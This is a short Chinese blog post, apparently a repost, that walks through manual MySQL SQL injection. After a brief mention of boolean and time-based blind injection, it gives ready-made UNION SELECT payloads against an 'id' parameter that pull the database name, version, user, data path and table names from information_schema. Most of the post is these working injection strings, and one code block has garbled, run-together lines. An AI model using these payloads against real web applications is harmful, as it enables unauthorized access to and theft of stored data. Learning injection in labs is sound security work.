---
layout: post
title: MySQL手工注入之基本注入流程
categories: 安全知识
description: MySQL手工注入之基本注入流程
keywords: sql注入
---

# mysql 盲注学习

盲注有哪些分类？
总体来讲，盲注分为**布尔型**和**延时型**两大类。

[一文搞定 MySQL 盲注](https://www.anquanke.com/post/id/266244#h3-2)

[sql 介绍](http://www.yowell.pw/?p=327)


# 收集信息
在爆出的字段值里面可以替换为我们的恶意语句，前期主要是收集信息，包括判断当前数据库是否是root用户，MySQL的版本等，一般收集这些信息常用一些MySQL自带的函数去收集信息:MySQL常用的系统函数

```dotnetcli
version()            #MySQL版本user()               
#数据库用户名database()           #数据库名@@datadir            #数据库路径
@@version_compile_os #操作系统版本

```

## 查询当前数据库名

```dotnetcli
id=1' and 1=2 UNION SELECT 1,database(),3 --+

```
## 查询MySQL版本

```dotnetcli

id=1' and 1=2 UNION SELECT 1,2,version() --+

```
## 查询数据库用户和路径

```dotnetcli
id=1' and 1=2 UNION SELECT 1,user(),@@datadir --+

```

# 查询表名

database 查询数据库

```dotnetcli
id=1' and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+

```
## 单引号-数据库

```dotnetcli
id=1' and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+

```

# 转载
[新手科普 | MySQL手工注入之基本注入流程
](https://cloud.tencent.com/developer/article/1482397)